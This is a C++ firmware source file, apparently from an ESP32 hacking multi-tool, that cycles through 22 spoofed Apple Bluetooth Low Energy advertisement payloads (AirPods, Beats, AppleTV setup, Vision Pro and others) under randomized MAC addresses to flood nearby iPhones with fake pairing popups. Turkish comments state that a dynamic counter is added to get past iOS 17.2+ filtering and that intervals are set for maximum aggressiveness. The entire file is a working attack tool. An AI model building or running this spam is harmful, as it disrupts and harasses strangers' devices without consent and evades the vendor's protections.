#if !defined(LITE_VERSION)
#include "apple_spam.h"
#include "ble_spam.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "esp_mac.h"
#include <globals.h>

extern void generateRandomMac(uint8_t *mac);

// Yeni nesil iOS cihazlar için güncellenmiş ve optimize edilmiş Apple Paketleri
static const uint8_t data_airpods[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
static const uint8_t data_airpods_pro[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
static const uint8_t data_airpods_max[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
static const uint8_t data_airpods_gen2[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
static const uint8_t data_airpods_gen3[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
static const uint8_t data_airpods_pro_gen2[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
static const uint8_t data_beats_solo_pro[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
static const uint8_t data_beats_studio_buds[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
static const uint8_t data_beats_fit_pro[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
static const uint8_t data_beats_studio_buds_plus[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
static const uint8_t data_apple_tv_setup[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95};
static const uint8_t data_setup_new_phone[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95};
static const uint8_t data_transfer_number[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95};
static const uint8_t data_tv_color_balance[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95};
static const uint8_t data_vision_pro[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95};
static const uint8_t data_apple_tv_connecting[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95};
static const uint8_t data_apple_tv_audio_sync[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x19, 0x60, 0x4c, 0x95};
static const uint8_t data_setup_new_apple_tv[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95};
static const uint8_t data_homepod_setup[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0B, 0x60, 0x4c, 0x95};
static const uint8_t data_homekit_apple_tv_setup[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0D, 0x60, 0x4c, 0x95};
static const uint8_t data_pair_apple_tv[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95};
static const uint8_t data_setup_new_ipad[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x40, 0x09, 0x60, 0x4c, 0x95};

static const ApplePayload apple_payloads[] = {
    {"AirPods",            data_airpods,            sizeof(data_airpods)},
    {"AirPods Pro",        data_airpods_pro,        sizeof(data_airpods_pro)},
    {"AirPods Max",        data_airpods_max,        sizeof(data_airpods_max)},
    {"AirPods Gen 2",      data_airpods_gen2,       sizeof(data_airpods_gen2)},
    {"AirPods Gen 3",      data_airpods_gen3,       sizeof(data_airpods_gen3)},
    {"AirPods Pro Gen 2",  data_airpods_pro_gen2,   sizeof(data_airpods_pro_gen2)},
    {"Beats Solo Pro",     data_beats_solo_pro,     sizeof(data_beats_solo_pro)},
    {"Beats Studio Buds",  data_beats_studio_buds,  sizeof(data_beats_studio_buds)},
    {"Beats Fit Pro",      data_beats_fit_pro,      sizeof(data_beats_fit_pro)},
    {"Beats Studio Buds+", data_beats_studio_buds_plus, sizeof(data_beats_studio_buds_plus)},
    {"AppleTV Setup",      data_apple_tv_setup,      sizeof(data_apple_tv_setup)},
    {"Setup New Phone",    data_setup_new_phone,    sizeof(data_setup_new_phone)},
    {"Transfer Number",    data_transfer_number,    sizeof(data_transfer_number)},
    {"TV Color Balance",   data_tv_color_balance,   sizeof(data_tv_color_balance)},
    {"Apple Vision Pro",   data_vision_pro,         sizeof(data_vision_pro)},
    {"AppleTV Connecting", data_apple_tv_connecting, sizeof(data_apple_tv_connecting)},
    {"AppleTV Audio Sync", data_apple_tv_audio_sync, sizeof(data_apple_tv_audio_sync)},
    {"Setup New AppleTV",  data_setup_new_apple_tv,  sizeof(data_setup_new_apple_tv)},
    {"HomePod Setup",      data_homepod_setup,      sizeof(data_homepod_setup)},
    {"HomeKit AppleTV",    data_homekit_apple_tv_setup, sizeof(data_homekit_apple_tv_setup)},
    {"Pair AppleTV",       data_pair_apple_tv,       sizeof(data_pair_apple_tv)},
    {"Setup New iPad",     data_setup_new_ipad,     sizeof(data_setup_new_ipad)}
};

static const int apple_payload_count = sizeof(apple_payloads) / sizeof(ApplePayload);
static bool apple_spam_running = false;
static int current_apple_payload = -1;
static BLEAdvertising *pAppleAdvertising = nullptr;

int getApplePayloadCount() { return apple_payload_count; }

const char *getApplePayloadName(int index) {
    if (index < 0 || index >= apple_payload_count) return "Unknown";
    return apple_payloads[index].name;
}

bool isAppleSpamRunning() { return apple_spam_running; }

// Reklam paketini oluşturup dinamik verileri enjekte eden yardımcı fonksiyon
void buildDynamicAdvertisement(BLEAdvertisementData &advData, int payloadIndex) {
    advData.setFlags(0x06); // General Discoverable & BR/EDR Not Supported

    uint8_t fullPayload[31];
    uint8_t payloadLen = apple_payloads[payloadIndex].length;
    
    // Apple Şirket Kodu Üretici Spesifik Verisi (0xFF)
    fullPayload[0] = payloadLen + 3; // Uzunluk (+1 tip, +2 dinamik alanlar)
    fullPayload[1] = 0xFF;           // Manufacturer Specific Data Tipi
    
    // Orijinal Apple verisini kopyala
    memcpy(&fullPayload[2], apple_payloads[payloadIndex].data, payloadLen);
    
    // iOS 17.2+ filtrelemesini aşmak için dinamik sayaç/zaman damgası ekleme
    uint16_t dynamicCounter = (uint16_t)(millis() & 0xFFFF);
    fullPayload[2 + payloadLen] = (dynamicCounter >> 8) & 0xFF;
    fullPayload[2 + payloadLen + 1] = dynamicCounter & 0xFF;

    // Tx Power (İletim Gücü) alanı ekleme (Yeni iOS sürümleri doğrulamak için arıyor)
    advData.addData(fullPayload, payloadLen + 4);
    uint8_t txPowerField[] = {0x02, 0x0A, 0x0C}; // Uzunluk 2, Tip 0x0A (Tx Power), Güç +12dBm
    advData.addData(txPowerField, 3);
}

void stopAppleSpam() {
    if (!apple_spam_running) return;
    apple_spam_running = false;

    if (pAppleAdvertising) {
        pAppleAdvertising->stop();
        pAppleAdvertising = nullptr;
    }

#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit();
#endif
    current_apple_payload = -1;
}

void quickAppleSpam(int payloadIndex) {
    if (payloadIndex < 0 || payloadIndex >= apple_payload_count) return;

    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);

    BLEDevice::init("");
    BLEAdvertising *pAdv = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData;
    
    buildDynamicAdvertisement(advertisementData, payloadIndex);

    pAdv->setAdvertisementData(advertisementData);
    pAdv->setScanResponseData(BLEAdvertisementData());
    pAdv->setMinInterval(32); // Sık paket gönderimi için optimize aralık
    pAdv->setMaxInterval(32); 
    pAdv->start();
    vTaskDelay(120 / portTICK_PERIOD_MS); // Kararlılık için süre hafifçe artırıldı
    pAdv->stop();
    vTaskDelay(10 / portTICK_PERIOD_MS);

#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit();
#endif
}

void startAppleSpamAll() {
    if (apple_spam_running) stopAppleSpam();
    apple_spam_running = true;

    drawMainBorderWithTitle("Spam All Apple");
    padprintln("");
    padprintln("Cycling 22 Apple payloads");
    padprintln("Press ESC to stop");

    int apple_index = 0;

    while (apple_spam_running) {
        if (check(EscPress)) {
            stopAppleSpam();
            returnToMenu = true;
            break;
        }

        displayTextLine(String(apple_payloads[apple_index].name) + " " + String(millis() / 1000) + "s");

        uint8_t macAddr[6];
        generateRandomMac(macAddr);
        esp_base_mac_addr_set(macAddr); // Her döngüde MAC adresini değiştir

        BLEDevice::init("");
        BLEAdvertising *pAdv = BLEDevice::getAdvertising();
        BLEAdvertisementData advertisementData;
        
        buildDynamicAdvertisement(advertisementData, apple_index);

        pAdv->setAdvertisementData(advertisementData);
        pAdv->setScanResponseData(BLEAdvertisementData());
        pAdv->setMinInterval(20); // Maksimum saldırganlık/hız ayarı
        pAdv->setMaxInterval(32);
        pAdv->start();
        vTaskDelay(150 / portTICK_PERIOD_MS);
        pAdv->stop();
        vTaskDelay(10 / portTICK_PERIOD_MS);

#if defined(CONFIG_IDF_TARGET_ESP32C5)
        esp_bt_controller_deinit();
#else
        BLEDevice::deinit();
#endif
        apple_index = (apple_index + 1) % apple_payload_count;
    }
}

void startAppleSpam(int payloadIndex) {
    if (payloadIndex < 0 || payloadIndex >= apple_payload_count) return;
    if (apple_spam_running) stopAppleSpam();

    current_apple_payload = payloadIndex;
    apple_spam_running = true;

    drawMainBorderWithTitle(apple_payloads[payloadIndex].name);
    padprintln("");
    padprintln("Press ESC to stop");

    while (apple_spam_running) {
        if (check(EscPress)) {
            stopAppleSpam();
            returnToMenu = true;
            break;
        }

        uint8_t macAddr[6];
        generateRandomMac(macAddr);
        esp_base_mac_addr_set(macAddr);

        BLEDevice::init("");
        pAppleAdvertising = BLEDevice::getAdvertising();
        BLEAdvertisementData advertisementData;
        
        buildDynamicAdvertisement(advertisementData, payloadIndex);

        pAppleAdvertising->setAdvertisementData(advertisementData);
        pAppleAdvertising->setScanResponseData(BLEAdvertisementData());
        pAppleAdvertising->setMinInterval(20);
        pAppleAdvertising->setMaxInterval(32);
        pAppleAdvertising->start();
        vTaskDelay(150 / portTICK_PERIOD_MS);
        pAppleAdvertising->stop();
        vTaskDelay(10 / portTICK_PERIOD_MS);

#if defined(CONFIG_IDF_TARGET_ESP32C5)
        esp_bt_controller_deinit();
#else
        BLEDevice::deinit();
#endif
        displayTextLine(String(apple_payloads[payloadIndex].name) + " " + String(millis() / 1000) + "s");
    }
}

void appleSubMenu() {
    std::vector<Option> appleOptions;
    appleOptions.push_back({"Spam All Apple", []() { startAppleSpamAll(); }});

    for (int i = 0; i < apple_payload_count; i++) {
        appleOptions.push_back({apple_payloads[i].name, [i]() { startAppleSpam(i); }});
    }

    appleOptions.push_back({"Back", []() { returnToMenu = true; }});
    loopOptions(appleOptions, MENU_TYPE_SUBMENU, "Apple Spam");
}
#endif
